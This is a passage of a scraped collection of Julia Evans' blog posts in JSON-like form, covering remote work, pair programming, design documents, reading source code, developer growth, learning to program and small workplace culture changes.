and\none that a lot of people are interested in potentially making. I think the questions I got can\nroughly be broken down into 3 kinds of concerns about working remote: \n\n \n Personal mental health/productivity concerns: Will I get lonely? Will I be too distracted when\nworking from home? Can I maintain good work/life balance? Will the travel impact my personal\nlife? \n Basic ability to do one’s job: Will I miss out on conversations in the office? How will\ncommunication work? Will people forget I exist? \n Career growth: Can I take responsibility for really important projects? Can I get promoted? Can I\nbe a leader? \n \n\n I’m going to talk about these in reverse order – I have the least to say about “will I get lonely”\nbecause although I think it’s a really important issue and it’s been a struggle for me sometimes,\nit’s varies a lot from person to person and I’m not sure what to say about it other than “leaving\nyour house is generally a good idea” :) \n\n What’s good about working remote? \n\n Before we get into the struggles of working remote, let’s talk about some of the benefits! \n\n The two main benefits are the obvious ones – I get to live where I want (Montreal) and have the job\nthat I want. And San Francisco tech companies in general pay a lot more than Montreal tech\ncompanies, so working for a SF tech company while living outside SF is great. \n\n A few other benefits: \n\n \n I have a lot of control over my working environment. It’s relatively easy to close Slack and\nfocus. \n I basically haven’t had to set an alarm for 4 years. \n There’s a nice community of remotes across the company. I’ve gotten to know a lot of wonderful\npeople. \n I can work from another city/country if I want (like I went to Berlin for 6 weeks in 2016 and it\nwasn’t disruptive, especially since my 2 teammates at the time lived in Europe). \n I live in a slightly shifted timezone (3 hours ahead of many people I work with), so I can get\nstuff done before anybody gets to work. \n \n\n Let’s talk about career development \n\n Here’s a question from Twitter! \n\n \n I think it’d be great to read about your experiences around career development (promotions,\nmentoring). I hear from a lot of remote devs that they mostly accept it’s not possible. And I’d\nalso be interested to know about your experiences being mentored. \n \n\n While working remote, I’ve been promoted more than once, mentored an intern, led large projects,\nmade major organizational changes (I redid our engineering ladders last year), taught onboarding\nclasses for new developers, and learned a lot from a lot of fantastic people. I am not a manager,\nbut my current manager is remote and I think he does a fantastic job. \n\n I think the main reason that this has worked for me is that I work in an organization which has a\nlot of remotes and very good support for remotes. A few other things that have helped me: \n\n \n Communicate a lot. (write lots of emails! Have lots of 1:1 conversations! Maybe overcommunicate!) \n Maintain a good network of people on various teams \n Have great remote role models that inspire me & show me that I can also be successful while working remote \n Have a lot of people who have invested a lot in helping me be successful ❤ (which i try to pay forward when I can) \n \n\n How do you learn from your colleagues remotely? \n\n I work at a company with a huge number of really talented people. I was worried that I wouldn’t be\nable to learn from them because I work remotely. I don’t think this has been true (I learned a\nlot!). \n\n However! When working remotely I do think you have to be much more intentional about how you\nconstruct your relationships with your coworkers. If I don’t explicitly decide to talk to someone,\nit’s very possible that I’ll literally never talk to them. (like there’s no chance I’ll run into\nthem serendipitously in the office). \n\n Here are 3 different ways I’ve learned from more experienced people. \n\n Way 1: Meet 1:1 with the person every week. \n\n One pattern that has been incredibly valuable is – meet with $person (on my team) 1:1 every week\nfor months/years and get advice from them about whatever I’m currently working on. One important\nthing to me in this kind of relationship is that the person be continuously invested/engaged in\nmy work – it’s way more useful to get advice from someone who’s familiar with everything I’ve\nbeen doing for the last year than from someone just swooping in with their thoughts. \n\n Way 2: Work with the person on a specific project. \n\n Earlier this year, I wanted to improve our engineering levels. I don’t think I could have done this\non my own, but I partnered with someone more experienced to do it! I did all the legwork (writing\nthe initial level definitions, interviewing, getting feedback, incorporating that feedback, writing\nthe final document), and he helped me make sure I was approaching the project in the right way and\ngetting feedback from the right people. I learned a lot from this! \n\n Way 3: Ask the person a question every few months. \n\n There are a few people who I talk to pretty infrequently (maybe once every few months) but when I\ntalk to them it’s very helpful! I usually try to go to them with really specific questions about\nthings I know that they know a lot about. For example, I had a very useful conversation about what\nit means to be a tech lead with a tech lead on another team recently! \n\n Remote communication \n\n A  ton  of people asked me questions about what I think of as sort of basic job health – how do you\nmake sure your coworkers don’t ignore you / leave you out of discussions, how do you communicate,\netc. \n\n My current theory about this is – as long as I work on a team with a lot of other remotes,\neverything will be fine. Working as the only remote on a team of people who are all in person seems\nlike hard mode – I have never done it and I’m not that interested in trying that. That said, I’ve\ntried to answer a few specific questions here. Here they are! \n\n How do you stay plugged into spontaneous conversations around the office? \n\n I don’t. My team (if I’m counting right) is 50% remote (6 remotes, 6 people in the office). I think\nengineering overall is maybe 20-25% remote but I’m not sure. \n\n I think this is actually a really important point to understand about remote work – on the remote\nteams I’ve been on, the the whole team has adopted a working style where all important team\ncommunication happens over Slack / video calls / email. IMO if your team is mostly remote, you’re\nforced to adopt a remote-first working style. \n\n How do you have idle/watercooler discussions? \n\n Spontaneous conversations with coworkers are really important though! I have 2 things I do to make\nsure I’m talking to people in an unstructured way from time to time. \n\n First, I have 5-6 weekly 1:1s with different people with no agenda. Most of them are with people on\nmy team, and I talk to 1 person not on my team. I find these really helpful for talking through\nthings we’re working on and what’s going on in the company. The other thing I do is – when I visit\nSan Francisco where the main office is, I schedule lots of 30-minute chats with people just to catch\nup.  These are a huge part of staying connected for me! \n\n One weird thing about the pattern of having weekly 1:1s with the same 5-6 people is – it means the\nnumber of people at work who I regularly talk to face-to-face is pretty small. This seems to be work\nokay but it’s definitely different from how my work relationships would look if I worked in an\noffice. \n\n https://donut.ai  is a cool system for pairing people up at random to talk and I’ve liked it when\nI’ve used it. \n\n What happens if you spend a week stuck on a problem? \n\n One concern I hear sometimes is – if you’re struggling for a week to fix a bug, will people notice?\nOr will people just think you’re not doing anything that week? \n\n I haven’t found this to be a big problem – sometimes I’ll spend 1 week trying to debug the same\nissue. I just make sure I communicate to my team that’s what I’m doing! Once I realize it’s going to\ntake a while to fix, I try to tell people I’m planning to spend a long time working on the bug\nbecause I think it’s serious and worth spending time on (which is good, because if someone\ndisagrees, we can talk about it!), document my progress, and I’ll generally talk about what I’m\nstruggling with in Slack or in my 1:1 meetings with people throughout the week. Sometimes they’ll\nhave ideas that help get me unstuck! \n\n So if I spend a week working on a tricky bug, the result is people usually understand why I spent so\nlong working on it, and once it’s fixed we can celebrate! \n\n Calendar management \n\n One challenging thing about all these weekly meetings I use to communicate is making sure I don’t\nfragment my calendar too much – it’s important to have enough time to focus! The meetings are all\nimportant – if I didn’t have the meetings, I’d be out of touch and couldn’t make decisions about\nwhat I should be  doing  with my focus time – but it’s important not to let them take over :) \n\n here are things I do to keep my calendar under control so I have time to focus and can leave work on\ntime: \n\n \n try to cluster meetings together (have a 1.5 hour meeting block so I only get interrupted once) \n block off 4-hour chunks of “focus time” in my calendar. People are good at respecting that. \n add an “end of day” block on my calendar at 5:30pm EST every day. This means that people know not\nto schedule things with me after I’m done for the day. Sometimes it’s unavoidable because 5:30\nEST is 2:30 in the home office, but people are really respectful and always ask if it’s okay first. \n \n\n I’m not an introvert, and I like working remotely \n\n One stereotype about remote workers is that we’re all introverts! I’m not sure if I’m really an\nintrovert – I really like having people around me and talking to people helps me think. I think it\ncan actually be really  useful  to be somewhat extroverted when working remotely, for a few\nreasons. \n\n When I started out, I needed to learn a lot of things pretty quickly to get started – at the time I\nwas working with Hadoop and doing a bunch of data engineering, and I had literally never heard of\nHadoop. It was really important for me then (and now!) not to be too self-conscious about asking\nquestions when I didn’t know what something was or was stuck. \n\n It’s also important to actively cultivate relationships with the people who I work with, so\nwhen in San Francisco I spend a ton of time talking to people (like I’ll often have nonstop meetings\nfor several hours). I think if I was more of an introvert it would be really exhausting to do that. \n\n Also I think it can be a little easier for your work to get kind of lost / unrecognized when working\nremote. So it’s been useful for me to err on the side of overcommunicating about what I’m up to and\nwhat I’m planning. \n\n What’s the setup like for meetings with people in the office, does it work well? \n\n There are basically 2 possibilities either I’m having a 1:1 meeting with someone (where we just use\ntheir webcam / laptop microphone), or I’m in a group meeting and we use a conference room’s A/V\nsetup. \n\n Meeting rooms have a really good A/V setup I can always hear people well and they can hear me well\nand see me. This is a huge deal – it can be really alienating to be in a meeting where people can’t\nhear you well and you have to keep repeating yourself. I can’t imagine working remotely without good\nvideoconferencing technology. \n\n How do you stay productive and also separate work/life at home? \n\n I try to stop working by 6pm or so. I usually work from my couch but have a coworking space I go to\nsometimes and sometimes work from cafes. A lot of people have written a lot about how it’s important\nto maintain a really clear work/life separation at home (have an office, use a coworking space). I\nwon’t argue with them but I don’t really do that. \n\n I’m used to working at home and now I find being at the main office a lot more distracting than\nworking from home. \n\n Working remote is a huge change \n\n This is a pretty positive post because I enjoy working remotely now and I think it’s worked out\nwell, but I think it’s important to understand that it’s a huge change in working style. I’ve had to\nbe a lot more careful and intentional about how I communicate with people at work. I really\nstruggled with feeling lonely/disconnected for at least a year after I started – it was a big\nadjustment and I think even a year or so after I started it wasn’t totally clear to me if it was\nsomething that was going to work for me long term. \n\n These days I have a good grasp of how to communicate with folks, I know what to do if I start to\nfeel a little disconnected, and I’ve been able to do work I’m proud of and I think even change the\nengineering culture at work a little bit :). I don’t feel like working remote ever gets in the way\nof anything I want to accomplish. \n\n I’m really glad that the folks who hired me took a chance and hired me to work remotely for them\neven though I’d never done it before! \n\n"},
{"url": "https://jvns.ca/blog/2014/08/05/pair-programming-is-amazing-except-when-its-not/", "title": "Pair programming is amazing! Except... when it's not.", "content": "\n      I wrote a blog post in March about\n why I find pair programming useful \nas a tool and why I enjoy it. There are entire companies like Pivotal\nthat do pair programming 100% of the time, and they find it useful. \n\n To get our terms straight, by “pair programming”, I mean “two people\nare trying to accomplish a task by sitting at a single computer\ntogether”. \n\n Some people mentioned after I wrote that blog post that they disliked\npair programming, sometimes strongly! Obviously these people aren’t\nwrong to not like it. So I asked people about their experiences: \n\n I'm pretty\ninterested in why people find pair programming hard or scary or not\nuseful. (I find it not-always-appropriate but a good tool.) —\nJulia Evans (@b0rk)  March 2,\n2014 \n\n People responded  wonderfully . You can see about 160 thoughtful\ntweets about what people find hard or difficult in this Storify\n What do you find hard about pair programming? .\nI learned a ton, and my view that “pair programming is great and you\ntotally should try it!!!” got tempered a little bit :) \n\n \n\n If you’re not up to reading all that, here are the broad categories\nthat the difficulties fell into. Thanks very much to everyone who\nresponded for giving permission for me to post their comments! \n\n “I’m completely drained after an hour or two” \n\n Pair programming is really intense. You concentrate really hard, don’t\ntake a lot of breaks, and it’s very mentally taxing.  Tons  of people\nbrought this up. And this seems to be true for everyone, even people\nwho find it a useful tool. \n\n \n “it can be very stressful and draining for an introvert, both\nproductivity killers in the long run.” -\n @hoxworth \n “I used to work at Pivotal (100% pairing). IME pairing makes\neverything go faster. Also exhausting.” -\n @shifrapr \n “definitely would not like my entire project to be pair programmed\nthough; even 2-3 days would be exhausting.” -\n @lojikil \n “Downsides I hear a lot when teaching workshops on pairing:\nexhausting” -  @moss \n “I find it sometimes awesome & sometimes really frustrating,\nhonestly. It can be exhausting,but also a way to discover unknown\nunknowns” -  @DanielleSucher \n “that being sad: pairing is great. All the time though would be\nexhausting (for me)” -  @qrush \n “It is hard sometimes because you need to be on the same wavelength\nas another person which can be tiring.” -\n @zmanji \n \n\n “I can’t type when there’s somebody looking. I hate pairing.” \n\n Anxiety around pairing is  really  common. Some people say that they\nfound it easier as time went on. Some people also didn’t! It can be\ngood to encourage someone to try something, but if someone’s tried and\nit just makes them super-anxious, respect that! \n\n \n “I hate pairing because I can’t type when there’s somebody looking\nand I get anxious when I watch somebody else typing for long D:” -\n @seaandsailor \n “I type somewhat slow and I always feel pressure (real or imagined)\nfrom the other person.” -  @Torwegia \n ” I have seen seasoned vim users writhe in pain upon having to watch\na normal user type at a typically glacial human speed :)” -\n @brandon_rhodes \n “I suffer keyboard anxiety when I haven’t paired in a while.” -\n @meangrape \n “anxiety, fear of being judged” -  @qrush \n “i get self-conscious, make dumb mistakes, confuse myself.. :(\npairing is the worst” -\n @wirehead2501 \n “it’s something about having someone see my process, like when\nyou’re writing an email with someone reading over your shoulder.” -\n @wirehead2501 \n \n\n “I only like pairing when my partner is a pleasure to work with” \n\n This is pretty key. Pairing is a pretty intimate thing to do – you’re\nletting people see exactly how you work. If you don’t trust and\nrespect the person that you’re pairing with, it doesn’t work. There\nalso seems to be some mystical magical pairing juice where with some\npeople it just doesn’t work, and with some people it’s amazing. \n\n \n ” once you’re pairing with an asshole, you might as well stop.\nThere’s no point.” -  @hsjuju2 \n “I only like pairing when my partner is a pleasure to work with. So\nI try to be too.” -  @rkulla \n “if you feel like someone will see you as less competent for voicing\nyour thoughts, I’d rather code by myself” -\n @hsjuju2 \n “I think the social rules of [Hacker School] make pairing a lot more\nhelpful and fun.” -  @hsjuju2 \n “yeah it really has to be a safe space. Done among people who trust\nand respect one another. It also builds trust and respect.” -\n @gigachurch \n \n\n “Talking through something doesn’t help me think” \n\n A lot of the reason that I like pairing is that talking helps me work\nthrough problems. People are different! Some people  hate  talking\nabout things to think. Something to be aware of. \n\n \n “personally I only make progress on problems when talking to\nsomeone.” -  @cartazio \n “I am  not  someone who thinks out loud, and i feel like that’s one\nreason pairing is hard for me.” -\n @wirehead2501 \n “like, not only do i not understand by talking, but trying to talk\nthrough something before i think = more confused” -\n @wirehead2501 \n “I’m someone who thinks out loud, and understands by talking,\nwhereas some people take that as bad” -\n @hsjuju2 \n \n\n This is also relevant to interviewing: advice like “try to talk\nthrough your issue!” works really well for some people, and badly\nfor others. \n\n “It’s bad when one person dominates” \n\n My first pairing experience (years ago) was with someone who was a\nmuch better programmer than me, and basically bulldozed through the\nproblem and left me no room to contribute. This really undermined my\nconfidence and was awful. \n\n When pairing with people with significantly less experience than me, I\ntry to be really careful about this. One good trick that I learned\nfrom Zach Allaun at Hacker School is to always pair on the less\nexperienced person’s project and/or let the newer person drive. If\nyou’re working on their project then they’re at least the expert on\nhow their project works, which helps a lot. \n\n “I love pair  debugging , not pair programming” \n\n Variations on this were pretty common. A few people said that they\nlike working together, but not for producing code. It’s totally okay\nto use pairing in specific ways (for teaching or for debugging or for\ndebugging), and not for other things. \n\n \n ”+1 for loving code reviews, pair programming, not do much. Pair\n debugging  on the other hand can be excellent.” -\n @pphaneuf \n “i actually find it really useful as a “let’s get to know how each\nother’s brain works” & a shortcut for coming up to speed on a\ncodebase or a new language. otherwise–i haven’t had really awesome\nexperiences with it.” -  @zmagg \n “I’m not sold on  always  pairing, but being able to debug or design\nw/ a second pair of eyes is often useful, & it helps share\nskills.” -  @silentbicycle \n “Can be a good way to learn. I was pretty much taught perl via pair\nprogramming years ago by a very patient coworker.” -\n @wendyck \n “I spend half my day staring into space letting solutions pop into\nmy head. Hard to do that with a partner there.” -\n @aconbere \n \n\n Pair programming is amazing… sometimes \n\n Pair programming can be a super useful tool. If you understand why\npeople (such as yourself, maybe!) might find it hard or stressful, you\ncan have more productive pairing sessions, and decide when pair\nprogramming is a good way to get a task done! \n"},
{"url": "https://jvns.ca/blog/2016/06/03/learning-to-like-design-documents/", "title": "Learning to like design documents", "content": "\n     \n\n Hi everyone! Today we’re going to talk about software engineering and process! \n\n A design document is where, before starting to implement a system, you write up a thing explaining what the system is supposed to do first and how you’re planning to accomplish that. I think there are basically two goals: \n\n \n tell people what you’re doing \n figure out design problems with the system before you’ve been coding for 2 months \n \n\n I understand that it’s super important to think ahead a lot before huge projects, but a little bit of thinking can be helpful even for smaller projects. I asked some people recently if they write design docs for small projects and some of them said “yeah totally! small ones! it helps! :D”. \n\n I used to get kind of grumpy when someone was like “hey julia can you write a design document for your system?” It would seem like a reasonable idea, though, so I’d try to do it! But the first couple of times I tried to write one I felt like it didn’t actually really help me! I liked the idea in principle, but I didn’t really know how to apply it and I felt like it was hard to get good feedback. \n\n Last week I wrote a design doc and I thought it was sort of helpful. Here are some current thoughts. \n\n it’s hard to get someone to read it \n\n One of the first reasons to be grumpy about writing a design document is “UGH. NOBODY IS EVEN GOING TO READ THIS. TOO MANY WORDS. WHY?!”. And I think it’s actually kind of true! Getting a good review of a system design is hard! If it is a big system, the person reviewing your system has to put this whole hypothetical thing into their head, and think about every single thing that could go wrong, and think about the risks of all those things, and what already exists, and how it fits with those things, and how it will scale, and UGH. \n\n So it’s not like a simple code review where you’re like “hey can you take a look after lunch?”. I ended up trying to think about it as a personal tool – I came up with some questions I wanted to answer before I started writing code, wrote down the options, and then for each one picked an answer that seemed reasonable to me. \n\n I realized that instead of trying to get someone to read it, I could just talk to them and explain everything in the document to them and my thinking, and then they could suggest ideas for what that might work better, or things that could go wrong that I hadn’t thought of! \n\n So then instead of it being like “Here is a LARGE DOCUMENT for you to read please review” it was more like “I have written extensive notes so that I can make sure to ask you all the most important questions I have and we can have a SUPER PRODUCTIVE MEETING”. A+ \n\n but what color will we paint the bikeshed \n\n The second reason to be grumpy is “oh no I will write it and I’ll get a lot of contradictory feedback that is not that constructive”. \n\n A couple years ago at work, I had a small project, and I wrote an email with my thinking & questions about the project to try to think through how I was going to do it. Good idea, julia! \n\n But then a bunch of people replied with a whole bunch of different suggestions and started a long discussion on the email thread that was not that useful to me. \n\n This wasn’t a disaster – everyone was just trying to help! Nobody was being a jerk. It did not ruin my life. I asked my manager to talk it through with me and we came up with a reasonable plan and the project got done and everything was fine. \n\n a couple of things about this: \n\n \n asking more people for feedback isn’t always better. Sometimes asking just one or two people is ok if it’s a small thing. \n I like to remember that having a bunch of conflicting opinions is actually a normal (and often good!) thing that won’t go away, and you just need to figure out some tactics to deal with it (maybe: “have a meeting with exactly one person from each team involved”, “figure out what hidden assumptions people have that are different”) \n \n\n smoke tests \n\n Also, on “nobody reads the whole thing” – it’s really useful to go in-depth into the design with  someone , but every single person doesn’t need to spend hours thinking about the thing. \n\n I think it’s sometimes useful to ask “hey just read this for 10 minutes and see if anything makes you EXTREMELY TERRIFIED AND WORRIED”. And often the answer is “yeah seems fine”, which is good! It doesn’t mean there are no problems, but it means that that person has some vague idea of what you’re doing and doesn’t think it’s totally unreasonable. \n\n ask about one thing \n\n Also also on “nobody reads the whole thing” – in general with any large review it’s way easier if you’re like “hey, i’m worried about this specific aspect and I know you know a lot about it – what do you think?” instead of “please read all the pages and tell me everything you think about everything”. \n\n coding is easier if you think first \n\n This is maybe sort of obvious! But – sometimes I start coding, and then an hour or day in I’m like “oh no, I didn’t think about this whole aspect of this project, hmm, what do I do?” \n\n After writing this design doc, when I went to write the code I was like, oh, I made a lot of these decisions already. This is easy to write! Cool! And there were still unexpected difficulties (surprise: unexpected difficulties never actually go away), but I felt like it helped. \n\n you can’t predict everything and it’s okay \n\n Another thing that made me grumpy about design docs was that – this idea that you can predict all the flaws in advance and design the perfect system is actually a total lie. I still ran into things that I’d forgotten to consider! \n\n So I think writing a design doc isn’t necessarily about predicting  everything  that could ever possibly go wrong. I mean, maybe there are magical wizards who can predict everything. But for me it really helped to let go of this idea that we’re going to be able to design the perfect system just because now I have a document with “Design” written at the top and some people to help me review it. \n\n Instead, we do the best we can, and make changes to adapt as we go along! \n\n watch your decisions change \n\n I asked a bunch of wonderful people about design docs a couple months ago and someone – I forget who right now – said “the reason you write them is  because  your requirements & ideas of how things should work will change over time, and it’s useful to track that”. And this is totally true! Often I’ll make a design decision, forget about it, and then 8 months later be like “ugh who made that decision and why???”. And then it was me, and I need to dig up an IM conversation from 8 months ago to try to figure it out. \n\n Things change in software all the time. Maybe: \n\n \n 2 years later, the software you decided to not use is a lot more mature \n the thing you thought was awesome, after doing some more research, had some really serious flaws that might now be a dealbreaker \n you suddenly are handling 20x more data than you thought you would be \n you did user research and the users said a lot of really unexpected things that make you want to reprioritize \n \n\n So if nothing else, I think design documents are cool as archaeological artifacts so that people from the future can understand you and why you decided what you did. \n\n what does design document mean to you? \n\n I think the word “design document” means some really specific things to\ndifferent people. Maybe it means a totally different thing to you! I’d be\ninterested in reading things that you found helpful when designing systems. As always I’m  on twitter . \n\n"},
{"url": "https://jvns.ca/blog/2014/12/29/on-reading-the-source-code-not-the-docs/", "title": "On reading the source code, not the docs", "content": "\n      In my first programming job, I worked at a  web development company \nand wrote modules for  Drupal  sites. \n\n Every so often, I’d need to understand some specific Drupal edge case\n(say, how the text in the tabs on a search page was determined). And it\nwouldn’t be documented. And Stack Overflow didn’t have any answers about\nit, and my  colleagues  didn’t know. I like\nto think of this as a “oh right I actually need to know how to program”\nmoment – nobody’s going to tell me what to do, I just need to figure it\nout. \n\n The consultancy’s cofounder was  Alex Dergachev ,\nand he taught me a really important thing! Whenever I had a question\nlike this, he’d tell me to just read Drupal’s source code, and then I’d\nknow the answer. This is pretty obvious in retrospect, but it wasn’t\nobvious to me at the time. \n\n I originally felt like Drupal was too complicated to understand (it’s a\nbig codebase!), but it turned out that if I tried I could usually figure\nout what I needed to know. \n\n This works particularly well when I understand pretty well what the code\nI’m using is doing, but am just unsure about some particular detail.\nFor example “will this button appear for all users, or only admin\nusers?” I use this all the time at work, and most of you probably do\ntoo! There are always details about code that aren’t exhaustively\ndocumented, and using grep to find answers is incredibly helpful. \n\n But sometimes reading the code doesn’t work. \n\n \n\n Recently I was writing a map reduce job, and there was an out of memory\nerror. And it wasn’t really obvious why, and I tried to look at the\nstack trace and read some relevant parts of the source code. And it\njust. did not. help. at. all. \n\n It turned out that I was doing a join, and the rows on the right side of\nthe join were too big, and this was causing\n Cascading  to be sad. But to understand\nthat, it was important to understand how Cascading joins worked! And I\ndidn’t know that at all. Thankfully I work with\n people \n who \n know \n things \nI don’t know about Hadoop and they could help figure it out. \n\n So it seems like there are a few different levels of bug difficulty: \n\n \n It’s immediately obvious to you what’s wrong \n You Google the exception, read some documentation or Stack Overflow,\nand then it’s immediately obvious what’s wrong \n You don’t know what’s wrong, but you know more or less where in the\n(open source) library code you’re using to look, and you can read the\ncode to figure it out \n You’re missing some bigger-picture of knowledge about the code you’re\nrunning that you need to understand the bug (like me not\nunderstanding how joins work in Cascading). \n \n\n I still struggle with approaching problems in #4 (especially if I\ndon’t know that I don’t know the Thing That I’m Missing). For now, I\njust  ask ,\nand often the people I work with have answers, and are really helpful. \n\n I think if I couldn’t do this, I’d read a lot of documentation and hope\nthat some of it was relevant. I’d love more ideas, though. Or if you\ndisagree with my hierarchy of bug difficulty that I made up 10 minutes\nago and have your own, I’d love to know that too :) :) \n"},
{"url": "https://jvns.ca/blog/2014/04/08/growing/", "title": "Becoming a better developer (it's not just writing more programs)", "content": "\n      I asked on Twitter today something I’d been talking to at lot of\nfriends about – how does someone become a senior developer? How do I\nknow what I should be practicing? What qualities should I be looking\nfor in mentors? \n\n The best answer I got was this blog post:\n On Being a Senior Engineer ,\nby  John Allspaw  at Etsy. I am mostly\nwriting this so I can remember go back and read that repeatedly. It\ntalks about \n\n \n\n \n taking and seeking out criticism and \n non-technical skills and \n estimates (eeep! so hard!) and \n doing tedious and boring work and \n raising up the people around you (“generosity of spirit”) and \n making tradeoffs explicit when making judgements and \n empathy  and \n cognitive bias and \n so much more \n \n\n But you should just go read it. \n\n I’ve also been thinking about this tweet by  @seriouspony : \n\n Myth: to get better at x, just do a lot more of it (writing/skating/coding, etc.) What/how you \"do\" X matters far more than how much/often. — Seriouspony (@seriouspony)  November 25, 2013 \n \n\n and how it’s easy to get stuck in a rut and keep doing the things\nyou’re comfortable with. I’d like to not do that. \n\n A few other things people linked me to that were interesting: \n\n \n Engineering Management \nby Yishan Wong \n Kate Matsudaira on leadership \n This  programmer competency matrix \nhas some good categories for purely technical skills \n A repository of\n job titles by Urban Airship \n a  software engineer title ladder \n Joel Spolsky on compensation and titles \n \n"},
{"url": "https://jvns.ca/blog/2015/02/17/how-i-learned-to-program-in-10-years/", "title": "How I learned to program in 10 years", "content": "\n      The other day someone emailed me asking advice to learn how to program.\nHe said he was planning to use “Learn Python the Hard Way”, which I\nunderstand is an excellent tutorial. I don’t generally like giving\nadvice, because I think it’s way too easy to generalize your own\nexperience into advice and do it wrong. \n\n But then I found I had something to say! I thought a little bit about\nthis blog, and how it might look like I sprang from the womb being\nexcited about strace or thinking about how to build an operating system,\nor whatever. But in fact I spent about 10 years learning to program\nbefore going to Hacker School, mostly at fairly low speeds. \n\n I drew a totally unscientific graph about what that felt like: \n\n     \n\n \n\n You should not try to conclude very much from this graph, but some\nevents include: \n\n \n I started learning to program in 2004, because my math teacher gave me\na TI-83 calculator and then I wrote BASIC programs in math class. \n A guy I added on MSN for some reasons I don’t totally remember told me\nto install Gentoo and use this new browser Firebird and I never tried\nGentoo but I did install a few Linux distributions! \n now I’ve been using Linux continuously for 11 years so that was a\npretty great decision I guess. \n My dad bought me Learning Perl and I was amazed to find out you could\nwrite subroutines and define your own variable names because on the\nTI-83 you only have about 26 variables (A-Z) and there are for loops\nbut no named functions \n I went to university in 2006 and somehow was given the root password\nto a lab with 4 Linux and 3 Windows computers and wrote some terrible\nperl scripts to do some user management and uh yeah \n I finish university, with degrees in math/computer science. At this\npoint (2011) I still basically don’t believe I’m any good at\nprogramming. I do not in any way consider applying to fancy jobs at\nGoogle or Microsoft or whatever. \n I get a  first job  and a  second job  and coding 40 hours a week teaches me\na lot about the software engineering side of programming \n \n\n So, I went back the other day to some of the older code I’d written,\nthinking it would be terrible. Here, I put it on Github:\n julias-first-programs . \n\n Notably missing is the perl script that I wrote in 2005 to convert the\ndigits of pi to midi music to write to a cd to give as a gift (?!). I\ncouldn’t find it. \n\n And, sure, it’s not great code, but that’s not what was the most\nsurprising to me. What was the most surprising was  how little of it  I\nfound. It turns out that in the first years I was learning to program, I\nwas also in school full-time, not studying computer science, and I\ndidn’t necessarily write a lot of programs! \n\n Most of what I found was little scripts like\n grepstuff.pl .\nAnd, sure, it’s not well-indented or anything. But the scope for most of\nthese was so small (I was the only person writing or running most of\nthem!) that it didn’t really matter if they weren’t well-engineered. \n\n Anyway, this is mostly to say – if you’re programming and just starting\nout, and worrying that people say you can learn to program in 24 hours\nor 12 weeks… whatever. It’s taken me 11 years so far, and I’m not done\n:) \n\n If you know how to program, and wrote your own version of this blog\npost, I would be interested to read it! \n\n Title shamelessly stolen from Peter Norvig’s  Teach Yourself Programming in Ten Years \n"},
{"url": "https://jvns.ca/blog/2017/04/16/making-small-culture-changes/", "title": "Making small culture changes", "content": "\n     \n\n A lot of the time we say that “culture comes from the top” and talk about the\nresponsibility of CEOs / executives / managers to set the culture. I think this\nis super true, but I am not a CEO or manager or anything. I work as a software\nengineer. \n\n It’s also true though that individual software engineers have some power! So I\nwant to talk about a few positive experiences me and my partner have had making\ntiny changes at work! It turns out I’ve mostly worked on interviewing /\nrecruiting in engineering. \n\n Here are a few examples of things my partner and I have tried to make a little\ndifferent at our jobs over the years. \n\n fairer interviews \n\n When I started doing phone interviews (a few years ago now), I wasn’t given any\nclear standards to evaluate the people I was interviewing. And I didn’t feel\nlike I was doing as good of job as I should be, so I asked some friends for\nadvice! One of my amazing friends suggested that I write down a rubric (a set\nof clear guidelines to determine whether the candidate passed the interview or\nnot) for myself to use. So I did! I found some other rubrics we were using\ninternally, and wrote “Julia’s phone screen rubric”. I put it in a public\ndocument and said other people could use it if they wanted too. \n\n Eventually some colleagues gave me some suggestions about things to add to my\nrubric, a few people started using it for themselves, and I made some changes.\nThen one day people decided to standardize how we evaluated phone screens, it\ngot adopted as the standards everyone in engineering was going to use to\nevaluate phone screens, and a few more changes were made to make it even\nbetter. \n\n It turns out that having consistent standards is really cool! There are a ton\nof different possible things to care about in interviews (do they test their\ncode? How are their debugging skills? Do they write ‘idiomatic’ code? how\ncharismatic is the person?). Having a clear rubric helps make sure that. \n\n I definitely didn’t change this by myself (in particular, somebody else made\nthe decision that all interviewers should use consistent standards, and many\nmany other people contributed) but I think I helped a little bit and that made\nme happy! \n\n Also I think this is an interesting example of how the best way to make change\nchanges over time – like, today if I wanted to change our interview rubrics I\nprobably wouldn’t just announce “hey, I’m changing how I do it!” because we\nhave an existing process and I think it’s important to respect that. But back\nthen I think that was a totally fine thing to do, because there wasn’t a\nconsistent standard anyway so introducing a new standard didn’t cause any\nconflict. \n\n building postmortem culture \n\n My partner  Kamal  started at an (awesome) new job recently, that he really likes.\nThey’re still relatively small, and hadn’t built a habit of regularly writing\npostmortems for every incident yet. After the first incident he worked on, he\nwrote a very detailed postmortem about what happened. \n\n A few weeks later, he told me “huh, other people have started regularly writing\npostmortems for their incidents too! It looks like we have a culture of\nregularly writing postmortems for incidents now!“. \n\n I thought this was really cool because it’s an example of how doing something\nyourself once or twice can make it way easier for people to do the same! It’s\nway easier to write a postmortem for an incident if you have an existing\ntemplate to work with that your coworker wrote last week. \n\n what to expect in interviews \n\n A few years ago my awesome coworker Kiran and I were talking about how a lot of candidates don’t know what to expect when interviewing at our company. We basically wanted to write down the same tips we’d give to a friend about how to prepare for the interview, except, well, just put them on the website and give them to everyone. There are a lot of basic things that aren’t obvious like: \n\n \n Should I bring a computer? \n What should I wear? \n One of the interviews involves the basics of the HTTP protocol so it’s important to be familiar with that! \n We expect people to code on their computer so it’s useful to set up some common project boilerplate in advance \n We really like it when people bring questions to ask their interviewers! \n \n\n I thought this was important because when I interviewed for jobs last, the\ninterviews and what kind of preparation people expected were often quite\ndifferent from company to company, and as a candidate (and especially as a\ncandidate who doesn’t already have a friend there!) it can be unnecessarily\nstressful. \n\n So we wrote up a “what to expect when interviewing”\n document , someone else made\nit into a pretty PDF, and we put it on the website! \n\n I just googled (“what to expect stripe”) and found out that today we publish 6\ndifferent “what to expect” documents for different jobs, and that there have\nbeen a lot of changes to the original document to improve it / keep it up to\ndate as our interview process has changed. So cool!! \n\n a more welcoming job description \n\n A bunch of our job descriptions got revamped recently. One thing I sometimes\nsee in job descriptions is “you should have experience in\n$EXACT_THING_YOU_WILL_BE_DOING”. I always find that frustrating because, well\n– lots of the best people I know didn’t have any experience with the specific\ntechnologies we work with before they started here (including me!) so why\nshould it be a requirement? \n\n So I was like “I know! I will write a job description that I think is a\nfair description of what we need!“. I wrote a job description for the  job I have . In\nparticular I added a new “Projects you could work on” section with specific\nexamples of projects so that people could see what they might actually work on.\nAnd then I got the appropriate people to review it, we made some changes, and\nit got posted! This was a pretty small thing but I think it is a good job\ndescription. \n\n And last week a manager on another team asked me for advice about how to make\ntheir job description more clear about what the job is and sound more\ninclusive and I told them what I 